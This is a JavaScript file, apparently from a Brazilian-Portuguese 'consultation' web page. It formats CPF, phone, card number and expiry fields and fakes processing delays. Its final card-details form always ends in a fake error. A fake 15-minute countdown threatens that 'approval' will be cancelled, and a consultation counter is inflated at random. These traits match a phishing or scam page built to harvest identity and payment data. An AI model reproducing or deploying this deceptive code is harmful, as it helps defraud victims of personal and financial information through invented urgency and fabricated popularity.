document.addEventListener('DOMContentLoaded', function() {
    // Formulário de Consulta
    const formConsulta = document.getElementById('formConsulta');
    if (formConsulta) {
        formConsulta.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Mostrar mensagem de loading
            document.getElementById('mensagem-loading').style.display = 'block';
            formConsulta.style.display = 'none';
            
            // Simular processamento
            setTimeout(function() {
                window.location.href = 'confirmacao.html';
            }, 3000);
        });
    }
    
    // Formulário Final
    const formFinalizacao = document.getElementById('formFinalizacao');
    if (formFinalizacao) {
        formFinalizacao.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Mostrar mensagem de loading
            document.getElementById('mensagem-final').style.display = 'block';
            formFinalizacao.style.display = 'none';
            
            // Simular processamento
            setTimeout(function() {
                alert('Erro no processamento. Por favor, tente novamente mais tarde.');
                document.getElementById('mensagem-final').style.display = 'none';
                formFinalizacao.style.display = 'block';
            }, 5000);
        });
    }
    
    // Máscaras para campos
    const cpfInput = document.getElementById('cpf');
    if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = value;
        });
    }
    
    const telefoneInput = document.getElementById('telefone');
    if (telefoneInput) {
        telefoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
            value = value.replace(/(\d)(\d{4})$/, '$1-$2');
            e.target.value = value;
        });
    }
    
    const cartaoInput = document.getElementById('cartao');
    if (cartaoInput) {
        cartaoInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            value = value.replace(/(\d{4})(\d)/, '$1 $2');
            e.target.value = value;
        });
    }
    
    const validadeInput = document.getElementById('validade');
    if (validadeInput) {
        validadeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.replace(/^(\d{2})(\d)/, '$1/$2');
            }
            e.target.value = value;
        });
    }
    
    // Contador regressivo na página de confirmação
    const mensagemUrgente = document.querySelector('.urgente');
    if (mensagemUrgente && mensagemUrgente.textContent.includes('15 minutos')) {
        let minutos = 15;
        const intervalo = setInterval(function() {
            minutos--;
            mensagemUrgente.innerHTML = `⚠️ <strong>Atenção:</strong> Você tem apenas <strong>${minutos} minutos</strong> para completar esta etapa. Após esse prazo, sua aprovação será cancelada.`;
            
            if (minutos <= 0) {
                clearInterval(intervalo);
                mensagemUrgente.innerHTML = '⏰ Seu tempo expirou. Por favor, recomece o processo.';
            }
        }, 60000);
    }
    
    // Simular contador de consultas
    const contadorElement = document.querySelector('.contador strong');
    if (contadorElement) {
        let contador = 6429871;
        setInterval(function() {
            contador += Math.floor(Math.random() * 10) + 1;
            contadorElement.textContent = contador.toLocaleString('pt-BR');
        }, 3000);
    }
});